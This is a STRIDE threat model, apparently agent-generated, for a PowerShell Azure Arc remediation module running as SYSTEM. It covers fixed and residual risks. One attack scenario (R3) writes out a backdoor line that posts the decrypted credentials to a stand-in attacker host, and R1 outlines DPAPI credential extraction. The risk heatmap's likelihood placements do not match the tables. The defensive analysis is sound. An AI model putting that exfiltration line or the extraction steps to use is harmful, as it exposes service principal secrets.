# STRIDE Threat Model — ArcRemediator

**Date:** 2026-05-20
**Scope:** ArcRemediator PowerShell module (merged `chore/gap-remediation` + STRIDE hardening items 1–6)
**Target:** Windows servers running Azure Arc health remediation as a SYSTEM-level scheduled task
**Analyst:** Automated STRIDE analysis via security_modeling agent

---

## Table of Contents

- [1. System Overview](#1-system-overview)
- [2. Trust Boundaries](#2-trust-boundaries)
- [3. Remediated Findings (STRIDE Hardening Items 1–6)](#3-remediated-findings-stride-hardening-items-16)
- [4. Residual Findings](#4-residual-findings)
  - [R1 — DPAPI LocalMachine Scope Allows Cross-Process Decryption](#r1--dpapi-localmachine-scope-allows-cross-process-decryption)
  - [R2 — Plaintext state.json Enables Safety-Control Bypass](#r2--plaintext-statejson-enables-safety-control-bypass)
  - [R3 — Module Code Not Authenticode-Signed](#r3--module-code-not-authenticode-signed)
  - [R4 — LAW Telemetry Silently Dropped on Ingestion Failure](#r4--law-telemetry-silently-dropped-on-ingestion-failure)
  - [R5 — No TLS Certificate Pinning for Entra/ARM Endpoints](#r5--no-tls-certificate-pinning-for-entraarm-endpoints)
  - [R6 — Kill-Switch Blob Writable via Direct RBAC](#r6--kill-switch-blob-writable-via-direct-rbac)
  - [R7 — Config Schema Not Validated Post-Decryption](#r7--config-schema-not-validated-post-decryption)
  - [R8 — Kill-Switch and Breaker-Reset Blob Content Unsigned](#r8--kill-switch-and-breaker-reset-blob-content-unsigned)
  - [R9 — Temp ClientSecret File Not Securely Deleted](#r9--temp-clientsecret-file-not-securely-deleted)
  - [R10 — No Enforced Certificate Rotation Policy](#r10--no-enforced-certificate-rotation-policy)
  - [R11 — Local Logs Deletable by Administrators](#r11--local-logs-deletable-by-administrators)
  - [R12 — Manual Breaker Reset Audit Deferred to Next Run](#r12--manual-breaker-reset-audit-deferred-to-next-run)
- [5. Risk Heatmap](#5-risk-heatmap)
- [6. Recommended Remediation Roadmap](#6-recommended-remediation-roadmap)

---

## 1. System Overview

ArcRemediator is a PowerShell 5.1 module deployed as a Windows Scheduled Task running under `NT AUTHORITY\SYSTEM`. It runs once daily and performs health assessment and remediation of Azure Arc Connected Machine agents:

- **Reads** a DPAPI-encrypted config containing Service Principal credentials (ClientSecret or Certificate thumbprint).
- **Acquires** Entra ID tokens (ARM + Monitor) using the SP credential.
- **Queries** Azure Resource Manager to classify the machine as Connected, Disconnected, or Expired.
- **Remediates** by restarting agent services (Disconnected) or performing a destructive delete+rejoin (Expired).
- **Reports** outcomes to Log Analytics Workspace (LAW) via Data Collection Rule (DCR).

### Key Components

| Component | Purpose |
|-----------|---------|
| `Invoke-ArcRemediation` | Top-level orchestrator; mutex, config load, token acquisition, dispatch |
| `Invoke-OrchestratorDispatch` | Probes + action branch (Connected/Disconnected/Expired) + breaker accounting |
| `Get-AzureToken` | Entra ID token acquisition (JWT-bearer for cert, client_credentials for secret) |
| `Get-AzureResourceState` | ARM GET classifier with 429 retry |
| `Get-KillSwitchState` | Fleet-wide kill-switch via SAS-protected blob |
| `Get-BreakerResetState` | Fleet-wide circuit breaker reset via SAS-protected blob |
| `Invoke-AzcmagentConnect` | Runs `azcmagent connect` with credential-safe argument handling |
| `Invoke-ExpiredRejoin` | Destructive path: ARM DELETE + reconnect |
| `Send-LogAnalytics` | LAW DCR ingestion |
| `Install.ps1` | DPAPI-wraps config, sets ACLs, registers scheduled task |

---

## 2. Trust Boundaries

```
┌──────────────────────────────────────────────────────────┐
│                    Azure Cloud                           │
│  ┌─────────────┐  ┌──────────┐  ┌────────────────────┐  │
│  │ Entra ID    │  │ ARM API  │  │ Storage (SAS blob)  │  │
│  │ (tokens)    │  │ (CRUD)   │  │ kill-switch/breaker │  │
│  └──────┬──────┘  └────┬─────┘  └─────────┬──────────┘  │
│         │              │                  │              │
│  ┌──────┴──────────────┴──────────────────┴──────────┐   │
│  │              LAW / DCR (telemetry)                │   │
│  └──────────────────────────────────────────────────┘   │
└───────────────────────┬──────────────────────────────────┘
                   TLS 1.2+
┌───────────────────────┴──────────────────────────────────┐
│                 Windows Server (SYSTEM)                   │
│                                                          │
│  ┌──────────────────────┐  ┌──────────────────────────┐  │
│  │ ArcRemediator Module │  │ azcmagent.exe            │  │
│  │ (PowerShell 5.1)     │──│ (Azure Connected Machine │  │
│  │ Scheduled Task       │  │  Agent)                  │  │
│  └──────────┬───────────┘  └──────────────────────────┘  │
│             │                                            │
│  ┌──────────┴───────────┐  ┌──────────────────────────┐  │
│  │ DPAPI config.json    │  │ state.json (plaintext)   │  │
│  │ (LocalMachine scope) │  │ Safety controls          │  │
│  └──────────────────────┘  └──────────────────────────┘  │
└──────────────────────────────────────────────────────────┘
```

| Boundary | Protection |
|----------|------------|
| Cloud ↔ Server | TLS 1.2+ (enforced via `Invoke-WebRequestWithTls` / `Invoke-RestMethodWithTls`) |
| Config at rest | DPAPI `LocalMachine` scope (SYSTEM + Administrators) |
| State at rest | NTFS ACLs on parent directory (no encryption) |
| Module code | NTFS ACLs on install path; no code signing |
| Scheduled task | Runs as `NT AUTHORITY\SYSTEM`; `-ExecutionPolicy Bypass` |
| ARM roles | Scoped to named resource groups (not subscription-level) |
| Storage blobs | Read-only SAS tokens with expiry |
| Service restarts | Validated against hardcoded allowed-list: `himds`, `GCArcService`, `ExtensionService`, `ArcProxyAgent` |

---

## 3. Remediated Findings (STRIDE Hardening Items 1–6)

These were identified in the initial STRIDE analysis and fixed in the `security/stride-hardening-items-1-6` branch, now merged.

### Item 1 — TOCTOU Race in Temp ClientSecret File (Tampering / Information Disclosure)

**Before:** `New-RestrictedTempConfig` wrote the file with `Set-Content` then applied ACLs with `Set-Acl`. A ~22ms window existed where the file was world-readable, allowing a `FileSystemWatcher`-based attack to extract the SP ClientSecret.

**Fix:** Replaced with atomic `[System.IO.FileStream]::new()` constructor that accepts a `FileSecurity` parameter. The file is born with restricted ACLs (SYSTEM + Administrators only); no TOCTOU window exists.

**Location:** `src/ArcRemediator/Private/Invoke-AzcmagentConnect.ps1` lines 263–305

### Item 2 — azcmagent.exe PATH Fallback Hijack (Elevation of Privilege)

**Before:** If the hardcoded `$env:ProgramFiles\AzureConnectedMachineAgent\azcmagent.exe` path was missing, `Invoke-Azcmagent` fell back to `Get-Command 'azcmagent.exe'`, which searches `$env:PATH`. An attacker could place a trojan binary in a user-writable `PATH` directory.

**Fix:** Removed the `Get-Command` fallback entirely. The function now checks only the hardcoded path and throws immediately if not found.

**Location:** `src/ArcRemediator/Private/Invoke-Azcmagent.ps1` lines 71–79

### Item 3 — ARM 429 Throttling Causes 24hr Remediation Gap (Denial of Service)

**Before:** A single ARM 429 response caused the entire run to classify as `ArmThrottled` with no retry. The machine would wait until the next daily scheduled task (up to 24 hours).

**Fix:** Added a `Get-RetryAfterSeconds` helper that parses the `Retry-After` header, clamped to [1, 60] seconds (default 10s). On 429, the function sleeps for the indicated period and retries once. If the retry also fails, it returns `ArmThrottled`.

**Location:** `src/ArcRemediator/Private/Get-AzureResourceState.ps1` lines 1–20 (helper), 130–155 (retry logic)

### Item 4 — Kill-Switch SAS Silent Expiry (Denial of Service)

**Before:** If the kill-switch SAS token expired, `Get-KillSwitchState` returned `CanProceed=$false` with `Reason='Unreachable'` — indistinguishable from an intentional fleet pause. The entire fleet could silently stop remediating with no warning.

**Fix:** Added SAS `se=` (signed expiry) parameter parsing in `Get-KillSwitchState`. If the SAS expires within 30 days, the returned object includes a `SasExpiryWarning` string. `Invoke-ArcRemediation` logs this warning on every run, giving operators a 30-day window to rotate.

**Location:** `src/ArcRemediator/Private/Get-KillSwitchState.ps1` (SAS parsing); `src/ArcRemediator/Public/Invoke-ArcRemediation.ps1` line 162 (warning log)

### Item 5 — Disconnected Service Restart Flapping (Denial of Service)

**Before:** Every daily run that found the machine Disconnected in Enforce mode would restart agent services. If the restart didn't help (e.g., network issue), the machine would restart services every 24 hours indefinitely, potentially disrupting service stability.

**Fix:** Added a 48-hour anti-flap cooldown. After a successful `Repair-AgentServices`, the run records `$state.LastServiceRepairUtc`. Subsequent runs within 48 hours return `ServiceRepairCooldown` without restarting. The `ConvertTo-RemediatorExitCode` function maps this to exit code 0 (no-op).

**Location:** `src/ArcRemediator/Private/Invoke-OrchestratorDispatch.ps1` (Disconnected branch); `src/ArcRemediator/Private/New-DefaultRemediatorState.ps1` (`LastServiceRepairUtc` field)

### Item 6 — Circuit Breaker Permanent Trip at Fleet Scale (Denial of Service)

**Before:** Once the circuit breaker tripped (3+ consecutive failures), the only recovery was a manual `Reset-ArcRemediator` on each individual machine. At fleet scale (thousands of machines), this was operationally infeasible.

**Fix:** Added fleet-wide auto-reset via a breaker-reset blob. When the breaker is tripped, `Invoke-OrchestratorDispatch` checks `$cfg.BreakerResetUrl` for an operator-issued timestamp. If the blob timestamp is newer than `$state.BreakerTrippedUtc`, the breaker auto-resets. A new `Get-BreakerResetState` function handles blob fetch, timestamp comparison, and SAS error redaction. The `BreakerTrippedUtc` field is now recorded when the breaker trips, enabling the comparison.

**Location:** `src/ArcRemediator/Private/Get-BreakerResetState.ps1` (new file); `src/ArcRemediator/Private/Invoke-OrchestratorDispatch.ps1` (Expired branch breaker check); `azure-setup/private/New-KillSwitchInfra.ps1` (SAS generation for breaker-reset blob)

---

## 4. Residual Findings

### R1 — DPAPI LocalMachine Scope Allows Cross-Process Decryption

| Attribute | Value |
|-----------|-------|
| **STRIDE Category** | Spoofing |
| **Severity** | High |
| **Likelihood** | Medium (requires SYSTEM or admin code execution) |
| **Status** | Open — Design-inherent |

#### Description

The Service Principal credentials are encrypted with `[System.Security.Cryptography.ProtectedData]::Protect()` using `DataProtectionScope::LocalMachine` (`src/ArcRemediator/Bootstrap/Install.ps1` line 273). This scope ties the encryption key to the machine's DPAPI master key, meaning **any process running as SYSTEM or a local Administrator** can call `Unprotect()` and recover the plaintext credentials — including the ClientSecret.

There is no process isolation, capability binding, or caller verification. A rogue SYSTEM-level process (e.g., from a compromised extension, driver, or scheduled task) can silently extract the SP credentials and use them to impersonate the remediator indefinitely.

#### Existing Controls

- NTFS ACLs restrict `%ProgramData%\ArcRemediator\` to SYSTEM + Administrators.
- The certificate credential path (`CredentialType=Certificate`) avoids storing a secret on disk entirely — the private key stays in the Windows certificate store.
- The ClientSecret path is documented as lab/canary only.

#### Attack Scenario

1. Attacker achieves code execution as any local Administrator (lateral movement, exploited service, etc.).
2. Attacker reads `%ProgramData%\ArcRemediator\config.json` (NTFS ACLs allow admin access).
3. Attacker calls `[ProtectedData]::Unprotect($bytes, $null, 'LocalMachine')` to recover plaintext.
4. Attacker extracts `ClientId` + `ClientSecret` (or uses the decrypted cert thumbprint to find the cert in the machine store).
5. Attacker acquires Entra ID tokens and can delete/rejoin Arc resources in the scoped resource groups.

#### Remediation Strategy

**Short-term (Accept + Compensate):**
- Mandate `CredentialType=Certificate` for all production deployments. Document that `ClientSecret` is for lab/canary only.
- Add a runtime check in `Invoke-ArcRemediation` that emits a warning-level LAW row if `CredentialType=ClientSecret` is detected in production.
- Ensure ARM roles for the SP are scoped to the minimum required resource groups (already implemented via `Set-ArcRgRoleAssignment.ps1`).

**Long-term (Reduce Attack Surface):**
- Migrate to a dedicated `gMSA` (Group Managed Service Account) for the scheduled task instead of SYSTEM. This reduces the set of processes that share the DPAPI scope.
- Investigate Azure Key Vault integration with Managed Identity for credential storage (eliminates local DPAPI entirely). Requires the Arc agent to be healthy for initial Key Vault access, creating a chicken-and-egg dependency that needs careful design.
- Consider Windows Credential Guard integration on supported OS versions.

---

### R2 — Plaintext state.json Enables Safety-Control Bypass

| Attribute | Value |
|-----------|-------|
| **STRIDE Category** | Tampering |
| **Severity** | High |
| **Likelihood** | Medium (requires admin access to the filesystem) |
| **Status** | Open |

#### Description

`state.json` is stored as unencrypted, unsigned JSON at `%ProgramData%\ArcRemediator\state.json`. It contains the safety controls that gate destructive operations:

- `BreakerTripped` (bool) — circuit breaker preventing Expired rejoin
- `BreakerTrippedUtc` (string) — timestamp of last breaker trip
- `ConsecutiveFailures` (int) — failure counter
- `LastExpiredAttemptStartedUtc` (string) — 7-day cooldown marker
- `LastServiceRepairUtc` (string) — 48-hour anti-flap marker
- `ResetByUser` (string) — audit trail for manual resets

An attacker with admin access can edit this file to:
- Set `BreakerTripped = false` to re-enable destructive Expired rejoin after the breaker intentionally tripped.
- Clear `LastExpiredAttemptStartedUtc` to bypass the 7-day cooldown and force immediate re-attempt.
- Clear `LastServiceRepairUtc` to bypass the 48-hour anti-flap gate.
- Forge `ResetByUser` to impersonate a different administrator.

#### Existing Controls

- NTFS ACLs on the parent directory restrict write access to SYSTEM + Administrators.
- `Set-RemediatorState` uses atomic temp-then-rename writes to prevent corruption.
- `Get-RemediatorState` throws on unparseable JSON (refuses to silently fall back to defaults, preserving cooldown markers).
- `Reset-ArcRemediator` records `ResetByUser` with a `local:<username>` prefix and logs locally.

#### Attack Scenario

1. Attacker with admin access modifies `state.json`: sets `BreakerTripped = false`, clears `LastExpiredAttemptStartedUtc`.
2. Next scheduled run sees no breaker, no cooldown — enters destructive Expired path.
3. If the machine's ARM classification is Expired, the remediator deletes and rejoins the Arc resource.
4. Attacker deletes local logs to cover the modification.

#### Remediation Strategy

**Short-term (Detect):**
- Add an HMAC-SHA256 signature field to `state.json`. The HMAC key can be derived from DPAPI (since SYSTEM already has access). On load, `Get-RemediatorState` verifies the HMAC before trusting any field. If the HMAC fails, treat as corruption: log a tamper-detection event, return defaults with breaker tripped (fail-closed), and emit a LAW alert row.
- Enable Windows File Auditing (`SACL`) on `state.json` for write operations. This creates a Windows Security Event Log entry (Event ID 4663) that is harder for a local attacker to delete than the remediator's own logs.

**Long-term (Prevent):**
- DPAPI-encrypt `state.json` the same way as `config.json`. This raises the bar: an attacker must call `Unprotect()` to read the state, modify it, then `Protect()` again. Combined with the HMAC, this makes blind tampering impractical.
- Move the breaker/cooldown markers to a tamper-evident store (e.g., Azure Storage blob with append-only WORM policy, or a Windows Event Log custom channel).

---

### R3 — Module Code Not Authenticode-Signed

| Attribute | Value |
|-----------|-------|
| **STRIDE Category** | Elevation of Privilege |
| **Severity** | High |
| **Likelihood** | Low-Medium (requires write access to install path) |
| **Status** | Open |

#### Description

The scheduled task is registered with `-ExecutionPolicy Bypass` (`src/ArcRemediator/Bootstrap/Install.ps1` line 170), disabling PowerShell's script signature verification. The module `.psm1` file dot-sources all `.ps1` files from `Private/` and `Public/` subdirectories. An attacker who can write to `%ProgramFiles%\ArcRemediator\` can inject a `.ps1` file that will be executed as SYSTEM on the next scheduled run.

#### Existing Controls

- `Install.ps1` sets NTFS ACLs on the install directory: Administrators=FullControl, SYSTEM=FullControl, Users=ReadAndExecute. Standard users cannot write.
- The `-SkipAclHardening` switch is available but documented as dev/test only.

#### Attack Scenario

1. Attacker gains admin-level file write to `%ProgramFiles%\ArcRemediator\Private\`.
2. Attacker creates `ZZZ-Backdoor.ps1` containing `Invoke-WebRequest -Uri 'https://attacker.example/exfil' -Body (Get-DecryptedConfig -Path ...)`.
3. Next scheduled run: `ArcRemediator.psm1` dot-sources all `Private/*.ps1` files alphabetically. The backdoor file loads into the module scope.
4. When the backdoor's function (or top-level code) executes, it runs as SYSTEM with full access to credentials, tokens, and ARM APIs.

#### Remediation Strategy

**Short-term (Detect):**
- Add a file-integrity check in `Invoke-RemediatorTask.ps1` (the scheduled task entry point). Before importing the module, compute SHA-256 hashes of all `.ps1`/`.psd1`/`.psm1` files and compare against a hash manifest created at install time. If any hash mismatches, refuse to run and log a tamper-alert.
- Store the hash manifest in a SYSTEM-only ACL'd location separate from the module directory.

**Long-term (Prevent):**
- Authenticode-sign all module scripts with a code-signing certificate. Change the execution policy from `Bypass` to `AllSigned`. This requires a code-signing PKI workflow but provides the strongest protection.
- Alternatively, use Constrained Language Mode (CLM) via AppLocker/WDAC policies to restrict which scripts SYSTEM can execute.

---

### R4 — LAW Telemetry Silently Dropped on Ingestion Failure

| Attribute | Value |
|-----------|-------|
| **STRIDE Category** | Repudiation |
| **Severity** | High |
| **Likelihood** | Medium (transient network failures at 02:00 AM) |
| **Status** | Open |

#### Description

`Send-LogAnalytics` (`src/ArcRemediator/Private/Send-LogAnalytics.ps1`) performs a single HTTP POST to the DCR endpoint. If the POST fails (network timeout, auth error, DCR misconfiguration), the function returns `Success=$false` and the caller logs the failure locally. There is **no retry, no persistent queue, and no deferred re-send**. The telemetry row is lost forever.

At fleet scale, if the LAW endpoint is temporarily unreachable during the nightly run window (e.g., DNS issue, DCR rotation, regional outage), the operator loses visibility into potentially thousands of machines.

#### Existing Controls

- Local log files record the run outcome even when LAW ingestion fails.
- The `LogIngestionFailed` flag is set on the returned result object.
- 14-day local log retention provides a forensic fallback.

#### Attack Scenario (Repudiation)

1. Attacker blocks egress to the LAW DCR endpoint (firewall rule, DNS poisoning, or proxy manipulation).
2. All scheduled runs execute and remediate normally but emit no cloud telemetry.
3. Operator monitoring LAW sees no data for 7+ days, cannot determine fleet health.
4. If destructive actions (Expired rejoin) occur during the blackout, there is no cloud audit trail. Only local logs survive, which the attacker can delete with admin access.

#### Remediation Strategy

**Short-term (Compensate):**
- Implement a local persistent queue: on ingestion failure, write the serialized row to a `pending/` subdirectory under the log path. On the next successful run, attempt to re-send all pending rows (up to a configurable limit, e.g., 30 days).
- Add an Azure Monitor alert rule on the LAW table: "alert if no rows received from machine X in 48 hours." This catches silent failures from the cloud side.

**Long-term (Strengthen):**
- Forward telemetry rows to the Windows Event Log (custom event source) in addition to LAW. Event Log forwarding (WEF) can then ship events to a central SIEM independently of the DCR path.
- Implement a secondary DCR endpoint (different region) as a failover target.

---

### R5 — No TLS Certificate Pinning for Entra/ARM Endpoints

| Attribute | Value |
|-----------|-------|
| **STRIDE Category** | Spoofing |
| **Severity** | Medium |
| **Likelihood** | Low (requires network MITM + rogue CA) |
| **Status** | Open — Acceptable risk for most deployments |

#### Description

`Invoke-WebRequestWithTls` and `Invoke-RestMethodWithTls` enforce a TLS 1.2+ floor but perform standard certificate validation (chain trust to a system-trusted CA). They do not pin certificates for `login.microsoftonline.com`, `management.azure.com`, or the LAW DCR endpoint. An attacker with both network positioning (e.g., corporate proxy, DNS hijack) and the ability to install a rogue root CA (or compromise an existing one) can intercept TLS traffic and steal SP credentials during token acquisition.

#### Existing Controls

- TLS 1.2+ enforcement eliminates downgrade attacks.
- Enterprise networks typically monitor CA trust store changes.
- Certificate credential path (JWT-bearer) sends a signed assertion, not the private key — the attacker gets a short-lived assertion, not the key itself.

#### Remediation Strategy

**Accept for most deployments.** The attack requires a combination of network MITM capability and rogue CA installation — a high bar that implies the machine is already deeply compromised.

**For zero-trust / high-security environments:**
- Implement certificate pinning for Entra and ARM endpoints using the `ServerCertificateValidationCallback` on `ServicePointManager`. Pin to Microsoft's intermediate CA certificates (not leaf certs, which rotate).
- Note: Pinning breaks corporate TLS inspection proxies. Provide a config flag (`AllowTlsInspection=$true`) to disable pinning in environments where TLS inspection is deliberate.

---

### R6 — Kill-Switch Blob Writable via Direct RBAC

| Attribute | Value |
|-----------|-------|
| **STRIDE Category** | Denial of Service |
| **Severity** | Medium |
| **Likelihood** | Medium (requires Storage Account RBAC access) |
| **Status** | Open |

#### Description

The kill-switch mechanism reads a blob via a read-only SAS URL. However, any identity with `Storage Blob Data Contributor` (or higher) on the Storage Account can directly write to the kill-switch blob, pausing the entire remediation fleet. The SAS token's read-only restriction only applies to SAS-authenticated requests; direct RBAC access bypasses it.

Similarly, the breaker-reset blob can be written to trigger fleet-wide breaker resets, potentially unblocking destructive operations prematurely.

#### Existing Controls

- `Setup-AzureSide.ps1` creates the Storage Account and generates SAS tokens with `sp=r` (read-only).
- The kill-switch is fail-closed: anything other than content exactly equaling `enabled` pauses the fleet.
- The breaker-reset is also fail-closed: unparseable or missing content leaves the breaker tripped.

#### Remediation Strategy

**Short-term (Detect):**
- Create an Azure Monitor alert on the Storage Account's diagnostic logs: alert on any `PutBlob` or `SetBlobContents` operation targeting the kill-switch or breaker-reset blobs. Response time: minutes.
- Restrict `Storage Blob Data Contributor` RBAC to a single break-glass operator identity (not team-level groups).

**Long-term (Prevent):**
- Enable Azure Storage Immutability Policies (WORM) on the kill-switch container with a time-based retention of 24 hours. This prevents rapid toggling but allows planned updates.
- Move to Azure App Configuration with Key Vault references for fleet control signals, replacing raw Storage blobs with a more auditable and access-controlled mechanism.

---

### R7 — Config Schema Not Validated Post-Decryption

| Attribute | Value |
|-----------|-------|
| **STRIDE Category** | Tampering |
| **Severity** | Medium |
| **Likelihood** | Low (requires DPAPI decryption ability = admin/SYSTEM) |
| **Status** | Open |

#### Description

`Get-DecryptedConfig` (`src/ArcRemediator/Private/Get-DecryptedConfig.ps1` line 55) decrypts the config and passes it through `ConvertFrom-Json`. No schema validation occurs. The caller trusts all fields. An attacker who can modify the encrypted config can:

- Set `Mode = 'Enforce'` on a machine that should be Observe-only.
- Lower `CircuitBreakerFailureThreshold` to 1 (trips on first failure).
- Add resource groups to `ScopedResourceGroups` to expand the blast radius.
- Set `EnableAutomaticAgentUpgrade = $true` on a cloud that doesn't support it (causes agent error).
- Inject arbitrary fields that might interact with future code.

#### Existing Controls

- DPAPI encryption means the attacker must be SYSTEM/admin to decrypt, modify, and re-encrypt.
- Cloud profile capability flags (`SupportsArcGateway`, `SupportsAutomaticAgentUpgrade`) are enforced independently of config values.
- `Mode` is validated against `@('Observe', 'Enforce')` with fallback to `Observe`.

#### Remediation Strategy

**Short-term (Low effort, high value):**
- Add a `Test-ConfigSchema` function called immediately after `Get-DecryptedConfig`. Validate:
  - Required fields exist and have correct types.
  - `CloudProfile` is in the allowed set (`Commercial`, `AzureGovernmentDoD`).
  - `CircuitBreakerFailureThreshold` is in range [1, 100].
  - `ScopedResourceGroups` is a non-empty string array.
  - `CredentialType` is `Certificate` or `ClientSecret`.
  - No unexpected top-level keys (defense against field injection).
- On validation failure, return `ConfigMismatch` and refuse to run.

**Long-term:**
- Include an HMAC-SHA256 field in the encrypted config (computed at install time from the config JSON + a machine-specific nonce). This detects any post-install modification.

---

### R8 — Kill-Switch and Breaker-Reset Blob Content Unsigned

| Attribute | Value |
|-----------|-------|
| **STRIDE Category** | Tampering / Spoofing |
| **Severity** | Medium |
| **Likelihood** | Low (SAS token must be leaked or RBAC compromised) |
| **Status** | Open — Acceptable risk with SAS rotation |

#### Description

Kill-switch blob content is plaintext (`enabled` / `disabled`). Breaker-reset blob content is a plaintext ISO-8601 timestamp. Neither has a cryptographic signature. If the SAS URL leaks (logs, config file on compromised machine, email), an attacker with write capability can forge blob content.

#### Existing Controls

- SAS tokens are generated with `sp=r` (read-only), preventing SAS-based writes.
- SAS expiry detection warns operators 30 days before token expiry (STRIDE Item 4).
- Kill-switch is fail-closed; breaker-reset is fail-closed.

#### Remediation Strategy

**Accept with SAS rotation.** The attack requires a write path (RBAC access or a leaked writable SAS). The read-only SAS and RBAC restrictions make this low-likelihood.

**If stronger assurance is needed:**
- Sign blob content with HMAC-SHA256 using a shared secret provisioned at `Setup-AzureSide.ps1` time and stored in each machine's DPAPI config. The blob format becomes `<content>\n<hmac>`. On read, verify the HMAC before trusting the content.

---

### R9 — Temp ClientSecret File Not Securely Deleted

| Attribute | Value |
|-----------|-------|
| **STRIDE Category** | Information Disclosure |
| **Severity** | Low |
| **Likelihood** | Low (requires disk forensics on a running server) |
| **Status** | Open — Acceptable risk |

#### Description

The `New-RestrictedTempConfig` function in `Invoke-AzcmagentConnect.ps1` creates a temporary YAML file containing the SP ClientSecret for `azcmagent connect`. The file is deleted in a `finally` block via `Remove-Item`. However, standard file deletion does not overwrite the disk sectors; the data is recoverable with forensic tools until the sectors are reused.

#### Existing Controls

- The file exists for < 5 minutes (connect timeout is 300s).
- NTFS ACLs restrict the file to SYSTEM + Administrators from creation (atomic `FileStream` with `FileSecurity`).
- The certificate credential path avoids writing secrets to disk entirely.

#### Remediation Strategy

**Accept.** The attack requires physical disk access or forensic tools on a running server — at which point the attacker already has SYSTEM-level access and can extract credentials through other means (e.g., DPAPI decryption).

**If defense-in-depth is desired:**
- Before deleting, overwrite the file with random bytes: `[byte[]]$rnd = New-Object byte[] $bytes.Length; [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($rnd); [System.IO.File]::WriteAllBytes($path, $rnd)`.
- On NTFS with SSD TRIM, even this is not guaranteed to overwrite the original sectors. True secure deletion on modern storage is extremely difficult.

---

### R10 — No Enforced Certificate Rotation Policy

| Attribute | Value |
|-----------|-------|
| **STRIDE Category** | Spoofing |
| **Severity** | Low |
| **Likelihood** | Low (requires certificate private key extraction) |
| **Status** | Open |

#### Description

When `CredentialType=Certificate`, the SP authenticates using a JWT signed with the certificate's private key. Certificates are typically issued with 1–2 year validity. If the private key is compromised, the attacker can sign JWTs and impersonate the remediator for the remaining certificate lifetime. There is no automatic rotation, no revocation check, and no expiry alerting.

#### Existing Controls

- The certificate private key is stored in the Windows certificate store with machine-level ACLs.
- The `Get-AzureToken` function builds JWTs with 10-minute validity (`nbf` to `exp`), limiting token replay windows.
- ARM role scoping limits what a stolen token can do.

#### Remediation Strategy

**Short-term:**
- Document a 90-day certificate rotation SOP in the ops runbook.
- Add certificate expiry detection similar to the SAS expiry warning (Item 4): in `Get-AzureToken`, check the certificate's `NotAfter` date and emit a warning if < 30 days remaining.

**Long-term:**
- Integrate with Azure Key Vault certificate auto-rotation.
- Implement Conditional Access policies on the SP that restrict token issuance to known IP ranges or compliant devices.

---

### R11 — Local Logs Deletable by Administrators

| Attribute | Value |
|-----------|-------|
| **STRIDE Category** | Repudiation |
| **Severity** | Low |
| **Likelihood** | Medium (any admin can delete files) |
| **Status** | Open |

#### Description

`Write-LocalLog` writes to `%ProgramData%\ArcRemediator\logs\`. While the parent directory has SYSTEM + Administrators ACLs, any administrator can delete or modify log files. Combined with R4 (LAW telemetry drop), an attacker who blocks LAW ingestion and deletes local logs can execute actions with no audit trail.

#### Existing Controls

- 14-day local log retention with best-effort cleanup.
- LAW telemetry provides a cloud-side audit trail (when ingestion succeeds).
- `Reset-ArcRemediator` records `ResetByUser` in state.json.

#### Remediation Strategy

**Short-term:**
- Forward critical events (breaker trip, breaker reset, Expired rejoin, tamper detection) to the Windows Event Log using `Write-EventLog`. The Security Event Log has stronger ACLs and integrates with Windows Event Forwarding (WEF) and SIEM solutions.
- Set a SACL on the logs directory to audit delete operations (Event ID 4663).

**Long-term:**
- Implement an append-only log format with HMAC chaining (each entry's HMAC includes the previous entry's HMAC). Deletion is detectable because the chain breaks.

---

### R12 — Manual Breaker Reset Audit Deferred to Next Run

| Attribute | Value |
|-----------|-------|
| **STRIDE Category** | Repudiation |
| **Severity** | Low |
| **Likelihood** | Low |
| **Status** | Open — Acceptable risk |

#### Description

When an operator runs `Reset-ArcRemediator`, the action is logged locally and the `ResetByUser` field is written to `state.json`. However, the cloud-side LAW row for the reset is only emitted on the next scheduled run (when the run result includes the updated state). If the next run fails or is blocked, there is no immediate cloud audit of the reset action.

#### Existing Controls

- Local log entry created immediately.
- `state.json` records `ResetByUser` with `local:<username>` prefix.
- Next successful run includes the updated state in the LAW row.

#### Remediation Strategy

**Accept.** The local log + state.json provide a forensic trail. The deferred LAW row is a visibility gap, not an audit gap.

**If immediate cloud audit is needed:**
- Have `Reset-ArcRemediator` directly call `Send-LogAnalytics` with a dedicated reset-event row. This requires the operator to have access to the Monitor credential (already available in the DPAPI config) and network access to the DCR endpoint.

---

## 5. Risk Heatmap

```
                         Impact
               Low       Medium      High       Critical
          ┌───────────┬───────────┬───────────┬───────────┐
          │           │           │           │           │
  High    │           │  R6  R7   │  R1  R2   │           │
          │           │  R8       │  R3  R4   │           │
          │           │           │           │           │
Likeli-   ├───────────┼───────────┼───────────┼───────────┤
hood      │           │           │           │           │
  Medium  │  R11      │  R10      │  R5       │           │
          │           │           │           │           │
          ├───────────┼───────────┼───────────┼───────────┤
          │           │           │           │           │
  Low     │  R12      │  R9       │           │           │
          │           │           │           │           │
          └───────────┴───────────┴───────────┴───────────┘
```

---

## 6. Recommended Remediation Roadmap

### Phase 1 — Quick Wins (1–2 weeks)

| # | Action | Finding | Effort |
|---|--------|---------|--------|
| 1 | Add HMAC-SHA256 to `state.json`; fail-closed on mismatch | R2 | Low |
| 2 | Add `Test-ConfigSchema` validation post-decryption | R7 | Low |
| 3 | Mandate `CredentialType=Certificate` for production; emit warning for ClientSecret | R1 | Low |
| 4 | Create Azure Monitor alert for kill-switch blob writes | R6 | Low |
| 5 | Create Azure Monitor alert for LAW ingestion gaps (no rows in 48h) | R4 | Low |

### Phase 2 — Structural Improvements (2–4 weeks)

| # | Action | Finding | Effort |
|---|--------|---------|--------|
| 6 | Implement local persistent retry queue for LAW ingestion | R4 | Medium |
| 7 | Add file-integrity hash manifest check in task entry point | R3 | Medium |
| 8 | Forward critical events to Windows Event Log | R11 | Medium |
| 9 | Add certificate expiry warning (mirror SAS expiry pattern) | R10 | Low |

### Phase 3 — Hardening (1–2 months)

| # | Action | Finding | Effort |
|---|--------|---------|--------|
| 10 | Authenticode-sign all module scripts; change to `AllSigned` execution policy | R3 | High |
| 11 | DPAPI-encrypt `state.json` | R2 | Medium |
| 12 | Migrate scheduled task to gMSA (reduce DPAPI blast radius) | R1 | High |
| 13 | HMAC-sign kill-switch/breaker blob content | R8 | Low |

### Accepted Risks

| # | Finding | Rationale |
|---|---------|-----------|
| R5 | No TLS cert pinning | Requires rogue CA + MITM; breaks TLS inspection proxies |
| R9 | Temp file not securely wiped | File has restricted ACLs, < 5 min lifespan; cert path avoids entirely |
| R12 | Deferred audit for manual reset | Local log + state.json provide forensic trail |
